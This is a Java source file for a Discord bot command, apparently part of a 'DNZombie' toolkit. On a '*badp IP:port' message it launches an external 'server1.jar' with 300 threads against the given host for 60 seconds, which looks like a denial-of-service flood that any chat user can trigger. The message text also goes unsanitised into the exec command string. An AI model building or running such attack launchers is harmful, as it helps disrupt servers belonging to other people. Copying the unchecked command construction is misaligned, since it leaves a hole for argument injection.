package ua.DNZombie.ZCommands.Main;

import java.awt.Color;
import java.io.IOException;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageChannel;
import net.dv8tion.jda.api.entities.MessageEmbed;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

public class BadpLaunch extends ListenerAdapter
{
    @Override
    public void onMessageReceived(final MessageReceivedEvent event) {
    	final MessageChannel channel = event.getChannel();
        final Message msg = event.getMessage();
        String mesag = msg.getContentDisplay();
        final EmbedBuilder eb = new EmbedBuilder();
        if (msg.getContentRaw().contains("*badp ")) {
        	if(msg.getChannel() != null) {
        		String port = mesag.split(":")[1];
                mesag = mesag.replace(":" + port, "");
                mesag = mesag.replace("*badp ", "");
                eb.setTitle("☠ Zombie answer ☠");
                eb.addField("BadPackets", "\n Sucesfully launched! \n IP:Port: " + "`" + mesag +  ":" + port + "`" + "\n Time: `60s`", false);
                eb.setColor(Color.RED);
                channel.sendMessageEmbeds(eb.build(), new MessageEmbed[0]).queue();
                
                try {
                    Runtime.getRuntime().exec("java -jar server1.jar host-" + mesag + " port-" + port + " threads-300");
                } catch (IOException e) {
                	System.out.println("BadPackets launch error!");
                }
        	}
        }
    }
}